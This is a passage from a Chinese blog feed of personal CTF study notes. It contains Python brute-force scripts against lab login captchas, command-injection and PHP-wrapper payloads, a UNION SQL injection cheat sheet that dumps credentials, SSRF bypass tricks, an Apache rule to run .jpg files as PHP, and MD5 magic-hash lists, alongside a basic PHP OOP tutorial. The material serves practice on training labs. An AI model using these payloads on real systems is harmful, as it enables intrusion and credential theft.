href="http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php">http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/index.php</a></p><p>程序猿：“该死的黑客，我让你绕！我验证一次就让你的验证码失效，看你怎么绕！”</p><p>这一关的验证码，验证一次以后就失效了，但是再次提交的时候就不需要再考虑验证码是否正确的问题了，所以在脚本中只要保证验证码为’’的就可以</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://lab1.xseclab.com/vcode2_a6e6bac0b47c8187b09deb20babc0e85/login.php&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line">header = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=3c39940da50b514038b3e9971ee5f57e&quot;</span>&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> pwd <span class="keyword">in</span> xrange(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;pwd&#x27;</span>:pwd,<span class="string">&#x27;vcode&#x27;</span>:<span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">ret = req.post(url, data=data, headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.text:</span><br><span class="line"><span class="built_in">print</span> ret.text</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;good: password is:&quot;</span> + <span class="built_in">str</span>(pwd)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;try:&quot;</span> + <span class="built_in">str</span>(pwd) + <span class="string">&quot; and result is :&quot;</span>+ ret.text</span><br></pre></td></tr></table></figure><p><a href="http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php">http://lab1.xseclab.com/vcode3_9d1ea7ad52ad93c04a837e0808b17097/index.php</a>  跟上面一样的脚本</p><p><a href="http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/">http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/</a></p><p>爆破再爆破，点击验证码再运行脚本哦，跟着获得另一个手机号，再获取验证码，再修改手机号再运行脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"> </span><br><span class="line">url = <span class="string">&quot;http://lab1.xseclab.com/vcode6_mobi_b46772933eb4c8b5175c67dbc44d8901/login.php&quot;</span></span><br><span class="line">req = requests.session()</span><br><span class="line">header = &#123;<span class="string">&quot;Cookie&quot;</span>:<span class="string">&quot;PHPSESSID=61556a5b2a6c2a03a2f35b199cbb5364&quot;</span>&#125;</span><br><span class="line"><span class="keyword">for</span> vcode <span class="keyword">in</span> xrange(<span class="number">100</span>,<span class="number">1000</span>):</span><br><span class="line">data=&#123;<span class="string">&#x27;username&#x27;</span>:<span class="string">&#x27;13388886666&#x27;</span>,<span class="string">&#x27;vcode&#x27;</span>:vcode, <span class="string">&#x27;Login&#x27;</span>:<span class="string">&#x27;submit&#x27;</span>&#125;</span><br><span class="line"><span class="comment"># data=&#123;&#x27;username&#x27;:&#x27;13399999999&#x27;,&#x27;vcode&#x27;:vcode, &#x27;Login&#x27;:&#x27;submit&#x27;&#125;</span></span><br><span class="line">ret = req.post(url, data=data, headers=header)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> ret.text:</span><br><span class="line"><span class="built_in">print</span> ret.text</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;good: vcode is:&quot;</span> + <span class="built_in">str</span>(vcode)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;try:&quot;</span> + <span class="built_in">str</span>(vcode) + <span class="string">&quot; and result is :&quot;</span>+ ret.text</span><br></pre></td></tr></table></figure><p> <strong>转自：<a href="https://blog.csdn.net/nzjdsds/article/details/82936249?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_baidulandingword-0&spm=1001.2101.3001.4242">大方子</a></strong></p>]]></content>
      
      
      <categories>
          
          <category> 自己看的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> 摘录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>自己看</title>
      <link href="2021/03/16/%E8%87%AA%E5%B7%B1%E7%9C%8B/"/>
      <url>2021/03/16/%E8%87%AA%E5%B7%B1%E7%9C%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="amp-amp-命令执行"><a href="#amp-amp-命令执行" class="headerlink" title="&amp;&amp;命令执行"></a>&amp;&amp;命令执行</h1><p>相关题目：**<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=0&id=5071&page=1">攻防世界command_execution</a>** </p><h2 id="掌握有关命令执行的知识"><a href="#掌握有关命令执行的知识" class="headerlink" title="掌握有关命令执行的知识"></a>掌握有关命令执行的知识</h2><p>windows 或 linux 下: command1 &amp;&amp; command2 先执行 command1，如果为真，再执行 command2 command1 | command2 只执行 command2 command1 &amp; command2 先执行 command2 后执行 command1 command1 || command2 先执行 command1，如果为假，再执行 command2 命令执行漏洞（| || &amp; &amp;&amp; 称为 管道符）</p><ol><li>执行一个 ping 带一个其他命令试试，果然能看到当前目录下的文件</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/16/fSQKOphTuoR69A8.png" alt="image-20210316211415096"></p><ol start="2"><li>到上一级目录看看有啥 <code>127.0.0.1 &amp;&amp; ls ../</code></li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/16/ZC1h4Wx7OJpqImi.png" alt="image-20210316211639409"></p><ol start="3"><li>找到home文件夹，进入</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/16/lZKfygPcHGF8ACe.png" alt="image-20210316212212091"></p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/16/uHAdYxD7CkV4BnP.png" alt="image-20210316212316656"></p><ol start="4"><li>利用cat命令打开flag.txt得到flag</li></ol><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/16/Dyhq564If2wHFom.png" alt="image-20210316212401699"></p><h1 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h1><p>​    <strong>robots.txt 文件是一个文本文件</strong>，使用任何一个常见的文 本编辑器，比如 Windows 系统自带的 Notepad，就可以创 建和编辑它[1] 。robots.txt 是一个协议，而不是一个命令。 robots.txt 是搜索引擎中访问网站的时候要查看的第一个 文件。robots.txt 文件告诉蜘蛛程序在服务器上什么文件 是可以被查看的。 当一个搜索蜘蛛访问一个站点时，它会首先检查该站点根 目录下是否存在 robots.txt，如果存在，搜索机器人就会 按照该文件中的内容来确定访问的范围；如果该文件不存 在，所有的搜索蜘蛛将能够访问网站上所有没有被口令保 护的页面。百度官方建议，仅当您的网站包含不希望被搜 索引擎收录的内容时，才需要使用 robots.txt 文件。如果 您希望搜索引擎收录网站上所有内容，请勿建立 robots.txt 文件。 如果将网站视为酒店里的一个房间，robots.txt 就是主人 在房间门口悬挂的“请勿打扰”或“欢迎打扫”的提示牌。这 个文件告诉来访的搜索引擎哪些房间可以进入和参观，哪 些房间因为存放贵重物品，或可能涉及住户及访客的隐私 而不对搜索引擎开放。但 robots.txt 不是命令，也不是防 火墙，如同守门人无法阻止窃贼等恶意闯入者。</p><h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><h2 id="php-input"><a href="#php-input" class="headerlink" title="php://input"></a>php://input</h2><p>如：<a href="https://adworld.xctf.org.cn/task/answer?type=web&number=3&grade=1&id=5415&page=1">xctf web 进阶</a></p><p>利用 <strong>Burp Suite</strong> 在重发器中加入<code>PHP://input</code> </p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/17/yXclYQ8uCvANIxF.png" alt="image-20210317204719499"></p><p>之后再下面加入php 代码 利用<code>system(&#39;ls&#39;)</code> 查看目录有什么</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/17/97Lv8tBwazXrZEg.png" alt="image-20210317204836698"></p><p>利用<code>cat命令</code> 打开 <code>fl4gisisish3r3.php</code> 找到flag</p><p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2021/03/17/JNGoKCizTWFOAXZ.png" alt="image-20210317205049961"></p><h2 id="data-text-plain"><a href="#data-text-plain" class="headerlink" title="data://text/plain"></a>data://text/plain</h2><ul><li>data://协议需要满足双on条件，作用和 php://input 类似</li></ul><p>如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain,&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure><p>或者</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+</span><br></pre></td></tr></table></figure><h2 id="php-filter"><a href="#php-filter" class="headerlink" title="php://filter"></a>php://filter</h2><p>使用<code>php://filter/read=convert.base64-encode/resource=</code>读取php文件源码</p><p>如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=xxx.php</span><br></pre></td></tr></table></figure><h1 id="SQL常用注入语句"><a href="#SQL常用注入语句" class="headerlink" title="SQL常用注入语句"></a>SQL常用注入语句</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">order by 4 -- -</span><br><span class="line">判断有多少列</span><br><span class="line">union select 1,2,3 -- -</span><br><span class="line">判断数据显示点</span><br><span class="line">union select 1,user(),database()­­ -- -</span><br><span class="line">显示出登录用户和数据库名</span><br><span class="line">union select 1,(select group_concat(table_name) from information_schema.tables where table_schema &#x3D; &#39;security&#39; ),3 -- -</span><br><span class="line">查看数据库有哪些表</span><br><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_schema &#x3D; &#39;security&#39; and table_name&#x3D;&#39;users&#39; ),3 -- -</span><br><span class="line">查看对应表有哪些列</span><br><span class="line">union select 1,(select group_concat(concat_ws(0x7e,username,password))from users),3 -- -</span><br><span class="line">查看账号密码信息</span><br></pre></td></tr></table></figure><h1 id="PHP-中创建对象"><a href="#PHP-中创建对象" class="headerlink" title="PHP 中创建对象"></a>PHP 中创建对象</h1><p>PHP 定义类通常语法格式如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class phpClass &#123;</span><br><span class="line">  var $var1;</span><br><span class="line">  var $var2 &#x3D; &quot;constant string&quot;;</span><br><span class="line">  </span><br><span class="line">  function myfunc ($arg1, $arg2) &#123;</span><br><span class="line">     [..]</span><br><span class="line">  &#125;</span><br><span class="line">  [..]</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>解析如下：</p><ul><li>类使用 <strong>class</strong> 关键字后加上类名定义。</li><li>类名后的一对大括号({})内可以定义变量和方法。</li><li>类的变量使用 <strong>var</strong> 来声明, 变量也可以初始化值。</li><li>函数定义类似 PHP 函数的定义，但函数只能通过该类及其实例化的对象访问。</li></ul><p>如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Site</span> </span>&#123;</span><br><span class="line">  <span class="comment">/* 成员变量 */</span></span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$url</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$title</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">/* 成员函数 */</span></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setUrl</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;url = <span class="variable">$par</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getUrl</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;url . PHP_EOL;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">setTitle</span>(<span class="params"><span class="variable">$par</span></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">$this</span>-&gt;title = <span class="variable">$par</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">getTitle</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;title . PHP_EOL;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>变量 <strong>$this</strong> 代表自身的对象。</p><p>类创建后，我们可以使用 <strong>new</strong> 运算符来实例化该类的对象：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$baidu &#x3D; new Site;</span><br><span class="line">$bilibili &#x3D; new Site;</span><br><span class="line">$google &#x3D; new Site;</span><br></pre></td></tr></table></figure><p>以上代码我们创建了三个对象，三个对象各自都是独立的，接下来我们来看看如何访问成员方法与成员变量。</p><h2 id="调用成员方法"><a href="#调用成员方法" class="headerlink" title="调用成员方法"></a>调用成员方法</h2><p>在实例化对象后，我们可以使用该对象调用成员方法，该对象的成员方法只能操作该对象的成员变量：ru</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; 调用成员函数，设置标题和URL</span><br><span class="line">$baidu-&gt;setTitle( &quot;百度&quot; );</span><br><span class="line">$bilibili-&gt;setTitle( &quot;哔哩哔哩&quot; );</span><br><span class="line">$google-&gt;setTitle( &quot;Google&quot; );</span><br><span class="line"></span><br><span class="line">$baidu-&gt;setUrl( &#39;www.baidu.com&#39; );</span><br><span class="line">$bilibili-&gt;setUrl( &#39;www.bilibili.com&#39; );</span><br><span class="line">$google-&gt;setUrl( &#39;www.google.com&#39; );</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 调用成员函数，获取标题和URL</span><br><span class="line">$baidu-&gt;getTitle();</span><br><span class="line">$bilibili-&gt;getTitle();</span><br><span class="line">$google-&gt;getTitle();</span><br><span class="line"></span><br><span class="line">$baidu-&gt;getUrl();</span><br><span class="line">$bilibili-&gt;getUrl();</span><br><span class="line">$google-&gt;getUrl();</span><br></pre></td></tr></table></figure><p>输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">百度</span><br><span class="line">哔哩哔哩</span><br><span class="line">Google</span><br><span class="line">www.baidu.com</span><br><span class="line">www.bilibili.com</span><br><span class="line">www.google.com</span><br></pre></td></tr></table></figure><p>详情见<a href="https://www.runoob.com/php/php-oop.html">菜鸟教程 PHP 面向对象</a></p><h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>1.让服务端去访问相应的网址</p><p>2.让服务端去访问自己所处内网的一些指纹文件来判断是否存在相应的cms</p><p>3.可以使用file、dict、gopher[11]、ftp协议进行请求访问相应的文件</p><p>4.攻击内网web应用（可以向内部任意主机的任意端口发送精心构造的数据包{payload}）</p><p>5.攻击内网应用程序（利用跨协议通信技术）</p><p>6.判断内网主机是否存活：方法是访问看是否有端口开放</p><p>7.DoS攻击（请求大文件，始终保持连接keep-alive always）</p><h2 id="绕过小技巧"><a href="#绕过小技巧" class="headerlink" title="绕过小技巧"></a>绕过小技巧</h2><p>注：<a href="https://www.secpulse.com/archives/65832.html">参考[8]</a>会有更详细的绕过方式总结</p><p>1.<a href="http://www.baidu.com/%E4%B8%8Ehttp://www.baidu.com/%E8%AF%B7%E6%B1%82%E6%97%B6%E6%98%AF%E7%9B%B8%E5%90%8C%E7%9A%84">http://baidu.com@www.baidu.com/与http://www.baidu.com/请求时是相同的</a></p><p>2.各种IP地址的进制转换</p><p>3.URL跳转绕过：<a href="http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/">http://www.hackersb.cn/redirect.php?url=http://192.168.0.1/</a></p><p>4.短网址绕过 <a href="http://t.cn/RwbLKDx">http://t.cn/RwbLKDx</a></p><p>5.xip.io来绕过：<a href="http://xxx.192.168.0.1.xip.io/">http://xxx.192.168.0.1.xip.io/</a> == 192.168.0.1 (xxx 任意）</p><p>指向任意ip的域名：xip.io(37signals开发实现的定制DNS服务)</p><p>6.限制了子网段，可以加 :80 端口绕过。<a href="http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80">http://tieba.baidu.com/f/commit/share/openShareApi?url=http://10.42.7.78:80</a></p><p>7.探测内网域名，或者将自己的域名解析到内网ip</p><p>8.例如 <a href="http://10.153.138.81/ts.php">http://10.153.138.81/ts.php</a> , 修复时容易出现的获取host时以/分割来确定host，</p><p>但这样可以用 <a href="http://10.153.138.81/">http://abc@10.153.138.81/</a> 绕过</p><h2 id="漏洞利用中牵涉的小技巧"><a href="#漏洞利用中牵涉的小技巧" class="headerlink" title="漏洞利用中牵涉的小技巧"></a>漏洞利用中牵涉的小技巧</h2><p>crontab -l 显示当前计划任务</p><p>crontab -r 清除当前计划任务</p><p>端口转发工具 socat</p><p>在Apache配置文件中写入下面的内容，就可以将jpg文件当做PHP文件来执行</p><p>AddType application/x-httpd-php .jpg</p><p>​                                                        <strong>转载自<a href="https://blog.csdn.net/lionzl/article/details/100570193">lionzl</a></strong></p><h1 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h1><p>经过<strong>MD5编码</strong>后常用的以<strong>0e</strong>开头的字符串或数字</p><h2 id="纯数字类："><a href="#纯数字类：" class="headerlink" title="纯数字类："></a><strong>纯数字类：</strong></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">240610708 </span><br><span class="line">0e462097431906509019562988736854</span><br><span class="line"> </span><br><span class="line">314282422 </span><br><span class="line">0e990995504821699494520356953734</span><br><span class="line"> </span><br><span class="line">571579406 </span><br><span class="line">0e972379832854295224118025748221</span><br><span class="line"> </span><br><span class="line">903251147 </span><br><span class="line">0e174510503823932942361353209384</span><br><span class="line">1110242161 </span><br><span class="line">0e435874558488625891324861198103</span><br><span class="line"> </span><br><span class="line">1320830526 </span><br><span class="line">0e912095958985483346995414060832</span><br><span class="line"> </span><br><span class="line">1586264293 </span><br><span class="line">0e622743671155995737639662718498</span><br><span class="line"> </span><br><span class="line">2302756269 </span><br><span class="line">0e250566888497473798724426794462</span><br><span class="line"> </span><br><span class="line">2427435592 </span><br><span class="line">0e067696952328669732475498472343</span><br><span class="line"> </span><br><span class="line">2653531602 </span><br><span class="line">0e877487522341544758028810610885</span><br><span class="line"> </span><br><span class="line">3293867441 </span><br><span class="line">0e471001201303602543921144570260</span><br><span class="line"> </span><br><span class="line">3295421201 </span><br><span class="line">0e703870333002232681239618856220</span><br><span class="line"> </span><br><span class="line">3465814713 </span><br><span class="line">0e258631645650999664521705537122</span><br><span class="line"> </span><br><span class="line">3524854780 </span><br><span class="line">0e507419062489887827087815735195</span><br><span class="line"> </span><br><span class="line">3908336290 </span><br><span class="line">0e807624498959190415881248245271</span><br><span class="line"> </span><br><span class="line">4011627063 </span><br><span class="line">0e485805687034439905938362701775</span><br><span class="line"> </span><br><span class="line">4775635065 </span><br><span class="line">0e998212089946640967599450361168</span><br><span class="line"> </span><br><span class="line">4790555361 </span><br><span class="line">0e643442214660994430134492464512</span><br><span class="line"> </span><br><span class="line">5432453531 </span><br><span class="line">0e512318699085881630861890526097</span><br><span class="line"> </span><br><span class="line">5579679820 </span><br><span class="line">0e877622011730221803461740184915</span><br><span class="line"> </span><br><span class="line">5585393579 </span><br><span class="line">0e664357355382305805992765337023</span><br><span class="line"> </span><br><span class="line">6376552501 </span><br><span class="line">0e165886706997482187870215578015</span><br><span class="line"> </span><br><span class="line">7124129977 </span><br><span class="line">0e500007361044747804682122060876</span><br><span class="line"> </span><br><span class="line">7197546197 </span><br><span class="line">0e915188576072469101457315675502</span><br><span class="line"> </span><br><span class="line">7656486157 </span><br><span class="line">0e451569119711843337267091732412</span><br></pre></td></tr></table></figure><h2 id="大写字母类："><a href="#大写字母类：" class="headerlink" title="大写字母类："></a>大写字母类：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">QLTHNDT </span><br><span class="line">0e405967825401955372549139051580</span><br><span class="line"></span><br><span class="line">QNKCDZO </span><br><span class="line">0e830400451993494058024219903391</span><br><span class="line"></span><br><span class="line">EEIZDOI </span><br><span class="line">0e782601363539291779881938479162</span><br><span class="line"></span><br><span class="line">TUFEPMC </span><br><span class="line">0e839407194569345277863905212547</span><br><span class="line"></span><br><span class="line">UTIPEZQ </span><br><span class="line">0e382098788231234954670291303879</span><br><span class="line"></span><br><span class="line">UYXFLOI </span><br><span class="line">0e552539585246568817348686838809</span><br><span class="line"></span><br><span class="line">IHKFRNS </span><br><span class="line">0e256160682445802696926137988570</span><br><span class="line"></span><br><span class="line">PJNPDWY </span><br><span class="line">0e291529052894702774557631701704</span><br><span class="line"></span><br><span class="line">ABJIHVY </span><br><span class="line">0e755264355178451322893275696586</span><br><span class="line"></span><br><span class="line">DQWRASX </span><br><span class="line">0e742373665639232907775599582643</span><br><span class="line"></span><br><span class="line">DYAXWCA </span><br><span class="line">0e424759758842488633464374063001</span><br><span class="line"></span><br><span class="line">GEGHBXL </span><br><span class="line">0e248776895502908863709684713578</span><br><span class="line"></span><br><span class="line">GGHMVOE </span><br><span class="line">0e362766013028313274586933780773</span><br><span class="line"></span><br><span class="line">GZECLQZ </span><br><span class="line">0e537612333747236407713628225676</span><br><span class="line"></span><br><span class="line">NWWKITQ </span><br><span class="line">0e763082070976038347657360817689</span><br><span class="line"></span><br><span class="line">NOOPCJF </span><br><span class="line">0e818888003657176127862245791911</span><br><span class="line"></span><br><span class="line">MAUXXQC </span><br><span class="line">0e478478466848439040434801845361</span><br><span class="line"></span><br><span class="line">MMHUWUV </span><br><span class="line">0e701732711630150438129209816536</span><br></pre></td></tr></table></figure><h1 id="正则匹配"><a href="#正则匹配" class="headerlink" title="正则匹配"></a>正则匹配</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">^：匹配字符串开始的位置</span><br><span class="line">$：匹配字符串结束的位置</span><br><span class="line">&#x2F;i：表示匹配的时候不区分大小写</span><br><span class="line">&#x2F;m：表示多行匹配，使边界字符 ^ 和 $ 匹配每一行的开头和结尾</span><br></pre></td></tr></table></figure><p>在linux下面表示当前目录是 ./ </p>]]></content>
      
      
      <categories>
          
          <category> 自己看的 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 基础 </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客美化</title>
      <link href="2021/03/14/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/"/>
      <url>2021/03/14/%E5%8D%9A%E5%AE%A2%E7%BE%8E%E5%8C%96/</url>
      
